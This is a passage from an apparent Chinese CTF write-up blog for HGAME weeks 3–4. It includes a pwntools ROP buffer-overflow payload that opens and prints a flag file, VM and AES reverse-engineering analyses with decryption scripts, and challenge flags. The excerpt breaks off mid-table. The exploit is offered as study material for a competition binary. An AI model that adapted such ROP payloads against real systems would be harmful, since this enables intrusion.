test   <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401583</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">56</span><span class="token operator">*</span><span class="token string">'A'</span><span class="token punctuation">,</span>rsi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>read<span class="token punctuation">,</span>rsi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rdi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>open_<span class="token punctuation">,</span>rsi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rdi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>read<span class="token punctuation">,</span>rdi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>puts<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token operator">*</span><span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"./flag\x00\x00"</span><span class="token punctuation">)</span>                                                                               

<span class="token comment">#hgame&#123;10578e800f8a0e1695ca5f6970e0228fec1e15b06a7622360dffa1f4aa09cdd6&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>由于基本见不到 <em>mov edi,eax</em> <em>push eax</em>,所以找不到简单的方法去把rax的值赋给rsi，后来经过<strong>语神</strong>的指导，他说不用去找mov rdi，rax这种东西，我当场蒙蔽，于是乎去寻找open()有关的文档，加上自己调试，发现open（）返回的eax居然是0x3。查了一下发现原来，每次open()返回的应该是一个最小的值，0,1,2这三个句柄对应的是标准输入，标准输出，标准错误，如果我们把其中某个关掉，那么会返回最小的那个。但是改了之后发现，怎么输入没有了。调试之后才发现open()函数执行时有类似 mov rdx,rsi这种指令，而我只要满足他是偶数(可读)就可以了，由此我发现以后可以利用一些函数的内部的操作进行ROP等等，不过得很熟悉。</p>
<p>堆题把我打裂开，不懂利用，来不及看了都怪这个海灯节(</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="WhitegiveRSA"><a href="#WhitegiveRSA" class="headerlink" title="WhitegiveRSA"></a>WhitegiveRSA</h4><p>思路估计两种，一种时以一些算法去攻击，另外一种就是查询有无使用以知的可分解的大素数</p>
<p>找到可用的脚本</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/rsa11.jpg" alt="1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/rsa12.jpg" alt="1"></p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME_WEEK4_WP</title>
    <url>/2021/03/14/HGAME_WEEK4_WP/</url>
    <content><![CDATA[<h2 id="WEEK4-RogerThat-WP"><a href="#WEEK4-RogerThat-WP" class="headerlink" title="WEEK4-RogerThat WP"></a>WEEK4-RogerThat WP</h2><p>这周有点寒碜，只有三道题</p>
<h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h4><p>这道题是一道虚拟机相关的题目，因此分许需要花不少时间，在没做出来之前也慢慢试着写点东西，希望也能有所收获。</p>
<p>首先寻找到main函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  FILE <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  <span class="token keyword">char</span> Buffer<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-38h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to ovm++!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_inilization</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_printf_</span><span class="token punctuation">(</span><span class="token string">"Your flag is: %s\n"</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"VM started successfully!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_vm_function</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_7FF7ADCEE378<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_7FF7ADCEBD68<span class="token punctuation">,</span> <span class="token number">0x22u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token string">"nop"</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v4 <span class="token punctuation">)</span>
    v5 <span class="token operator">=</span> <span class="token string">"good"</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/breakpoints.jpg" alt="breakpoints"></p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">#dialog
mov 83 to 000000B1524FF781
mov 46 to 000000B1524FF780
mov 23 to 000000B1524FF77F
mov 1 to 000000B1524FF77E
mov EC to 000000B1524FF77D
#.....
mov 90 to 000000B1524FF764
mov 75 to 000000B1524FF763
mov 5A to 000000B1524FF762
mov 39 to 000000B1524FF761
mov E9 to 000000B1524FF760
#一次循环加密
mov 9 to 000000B1524FF781
mov 2C to 000000B1524FF780
mov 69 to 000000B1524FF77F
mov A7 to 000000B1524FF77E
mov F2 to 000000B1524FF77D
#...
mov 3B to 000000B1524FF763
mov 80 to 000000B1524FF762
mov BF to 000000B1524FF761
mov CF to 000000B1524FF760
#第二次加密<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>大致可以得出是加密了两遍，把某一个值计算得到后移到对应位置，这个位置从最后一位到第一位再从最后一位到第一位，两次加密，得到结果</p>
<p>再进一步看看每个位置的结果是结果什么得到的</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">#第一次循环下
rdx:A
rdx:8
rdx:C
rdx:B
rdx:D
rdx:12
rdx:14
rdx:D
rdx:2&#x2F;&#x2F;different
rdx:13
rdx:7
rdx:15
rdx:C
rdx:11&#x2F;different
rdx:9
rdx:16
#第二次循环下
rdx:A
rdx:8
rdx:C
rdx:B
rdx:D
rdx:12
rdx:14
rdx:D
rdx:6 &#x2F;&#x2F;different
rdx:13
rdx:7
rdx:15
rdx:C
rdx:4 &#x2F;&#x2F;different
rdx:9
rdx:16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">A:PUSH_BX
8:PUSH
C:POP_AX
B:PUSH_DX
D:POP_BX
12:CMP
14:JZ
D:POP_BX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>由此可见A,8,C,B,D,12,14,D,2,13,7,15,C,11,9,16;这些 OPCODE 组成了一个加密的循环，而第一个嘛我也不清楚，总之它的结果是’{‘—&gt;?应该也不用太在意</p>
<p>通过对比两次输入的rdx流，发现这个关于每个字符是独立加密的，也就是缺少“扩散”的一种加密方法，虽然这样我更好做题目了，hhha</p>
<p>整理加密的伪代码之后得到如下结果</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">struct VM&#123;
        uint64_t *alloc_mem_pt;
        uint64_t *buffer_pt;
        uint8_t a;
        uint8_t x1;
        uint8_t x2;
        uint8_t x3;
        uint8_t x4;
        uint8_t b;
&#125;vm;

&#x2F;&#x2F;A:
    vm.x3 &#x3D; v8 + 1;
    *(_BYTE *)(vm.x3 + pt_of_memory) &#x3D; vm.x1;
    goto LABEL_32;
&#x2F;&#x2F;8:
    function();
    vm.x3 &#x3D; v8 + 1;
    *(_BYTE *)(vm.x3 + pt_of_memory) &#x3D; v2;

&#x2F;&#x2F;。。。。。。。。。。。。。
&#x2F;&#x2F;。。。。。。。。。。。。。
&#x2F;&#x2F;我的愚昧的伪代码，留在这警示一下我自己 &#x2F;吐血.jpg
    result &#x3D; *a1;
    v7 &#x3D; *a1 + 8 * v18;
    if ( !*(_BYTE *)(v7 + 4) )
        continue;

void function()&#123;
    v11 &#x3D; v5++;
    vm.x4 &#x3D; v5;
    v2 &#x3D; *(_BYTE *)(*a1 + 8 * v11);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>接下来思路就简单了，要么静态分析，要么动态调试一波，总之为了理解这个程序流不择手段2333<br>其实也可以分析汇编，不过估计伪代码应该比汇编简单一些</p>
<p>大意了，看出第一个循环是从后往前异或，没想到第二个循环变了.</p>
<p>这里吐槽一下我自己吧，伪代码已经那么诡异了，我为什么还要把伪代码修改成我自己的伪代码……………………………直接看ida的伪代码看熟悉了应该就可以了吧，如果真的要写成我自己的伪代码的话，估计得涉及到很多高级的重构方法了，要是真的能那么做的话，我也可以写个IDA了hhhha，所以结论就是我应该做不到</p>
<p>看出第一个阶段是异或，第二个阶段是减去莫个值，因此我们dump下来这个值就好了</p>
<p>上脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">encrypted   <span class="token operator">=</span><span class="token string">b'\xCF\xBF\x80\x3B\xF6\xAF\x7E\x02\x24\xED\x70\x3A\xF4\xEB\x7A\x4A\xE7\xF7\xA2\x67\x17\xF0\xC6\x76\x36\xE8\xAD\x82\x2E\xDB\xB7\x4F\xE6\x09'</span>
xor_key     <span class="token operator">=</span><span class="token string">b'\xFE\x21\x44\x67\x8A\xAD\xD0\xF3\x16\x39\x5C\x7F\xA2\xC5\xE8\x0B\x2E\x51\x74\x97\xBA\xDD\x00\x23\x46\x69\x8C\xAF\xD2\xF5\x18\x3B\x5E\x81'</span>
decrease_key<span class="token operator">=</span><span class="token string">b'\x7A\x1A\xBA\x5A\xFA\x9A\x3A\xDA\x7A\x1A\xBA\x5A\xFA\x9A\x3A\xDA\x7A\x1A\xBA\x5A\xFA\x9A\x3A\xDA\x7A\x1A\xBA\x5A\xFA\x9A\x3A\xDA\x7A\x1A'</span>
decrypted   <span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>decrease_key<span class="token punctuation">[</span><span class="token number">33</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    temp_num <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xFF</span>
    temp_num <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>xor_key<span class="token punctuation">[</span><span class="token number">33</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    decrypted <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp_num<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>decrypted<span class="token punctuation">)</span>
<span class="token comment">#decrypted = “hgame&#123;w0W!itS_CpP_wItH_little_vM!&#125;”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>看来还有好多可以琢磨的了，怪不得这道题有人做这么快。这个虚拟机的指令真的不是简单的指令，我本来以为是相当于push,pop这种，最后想一下应该是相当于一个函数了，然后又因为一些交叉的变量看起来比较复杂，这点看来很值得思考了。</p>
<p>x64日志dump挺好用的，<a href="https://help.x64dbg.com/en/latest/introduction/Formatting.html">https://help.x64dbg.com/en/latest/introduction/Formatting.html</a></p>
<h4 id="nllvm"><a href="#nllvm" class="headerlink" title="nllvm"></a>nllvm</h4><p>虽说和 llvm 和 ollvm 有一定关系，但是这个混淆只是单纯的增长，程序流并没有混淆</p>
<p>根据程序流，或者根据加密过程中 <strong>sbox</strong> ，可以判断出是 aes ，但是是不是 aes 变种呢，由于我对aes-256 cbc 有所误解，以为key的长度不能是 64 字节，导致我只好手撸这道题，不过想来，如果这样子的话我以后就能对付变种了，虽然。。。建立在我被自己坑的基础上。</p>
<p>不过由于是数论的东西，我也要mark一下。在 GF(2^8) 域上，加法和乘法不是我们一般的域的加法，乘法则需要左移一位，然后再判断正负,乘以 0x1b 之类，正如下面的 Multiply 宏定义。而 xtime 是用于乘法，详细的见<a href="https://www.cnblogs.com/Jeely/p/11724506.html%EF%BC%8C%E5%85%B6%E5%AE%9E%E6%89%8B%E6%92%B8">https://www.cnblogs.com/Jeely/p/11724506.html，其实手撸</a> aes 我觉得还是挺有价值的。因为我大一下 hgame 中也做过一道，那道我是用代码辅助手算得到的 flag ，痛苦得很。。。不过感觉数论好重要啊。。。可能我是一个密码手 2333</p>
<p>如果要复现的话一种可能就是用宏函数，在没有什么优化的情况下应该是能让函数如此之长，还有一种就是使用一些混淆的工具，如 ollvm 这种，这种应该就要调试分析了。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">Multiply</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>                                </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> x<span class="token punctuation">)</span> <span class="token operator">^</span>                              </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">1</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">xtime</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span>                       </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">2</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span>                </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span>         </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">4</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span><span class="token function">xtime</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   </span><span class="token punctuation">\</span>
</span>
<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">uint8_t</span> rsbox<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0xd5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9e</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xf3</span><span class="token punctuation">,</span> <span class="token number">0xd7</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span>
        <span class="token number">0x7c</span><span class="token punctuation">,</span> <span class="token number">0xe3</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0x2f</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x8e</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0xc4</span><span class="token punctuation">,</span> <span class="token number">0xde</span><span class="token punctuation">,</span> <span class="token number">0xe9</span><span class="token punctuation">,</span> <span class="token number">0xcb</span><span class="token punctuation">,</span>
        <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0xc2</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x3d</span><span class="token punctuation">,</span> <span class="token number">0xee</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0xfa</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x4e</span><span class="token punctuation">,</span>
        <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x2e</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0xb2</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0xa2</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x6d</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0xd1</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span>
        <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xd4</span><span class="token punctuation">,</span> <span class="token number">0xa4</span><span class="token punctuation">,</span> <span class="token number">0x5c</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xb6</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span>
        <span class="token number">0x6c</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xfd</span><span class="token punctuation">,</span> <span class="token number">0xed</span><span class="token punctuation">,</span> <span class="token number">0xb9</span><span class="token punctuation">,</span> <span class="token number">0xda</span><span class="token punctuation">,</span> <span class="token number">0x5e</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xa7</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>
        <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0xab</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x8c</span><span class="token punctuation">,</span> <span class="token number">0xbc</span><span class="token punctuation">,</span> <span class="token number">0xd3</span><span class="token punctuation">,</span> <span class="token number">0x0a</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0xe4</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0xb8</span><span class="token punctuation">,</span> <span class="token number">0xb3</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span>
        <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x1e</span><span class="token punctuation">,</span> <span class="token number">0x8f</span><span class="token punctuation">,</span> <span class="token number">0xca</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xc1</span><span class="token punctuation">,</span> <span class="token number">0xaf</span><span class="token punctuation">,</span> <span class="token number">0xbd</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span>
        <span class="token number">0x3a</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x4f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xea</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0xf2</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span> <span class="token number">0xce</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token number">0xb4</span><span class="token punctuation">,</span> <span class="token number">0xe6</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span>
        <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0xac</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xe7</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xe2</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0x1c</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xdf</span><span class="token punctuation">,</span> <span class="token number">0x6e</span><span class="token punctuation">,</span>
        <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xf1</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x1d</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xc5</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0xaa</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span>
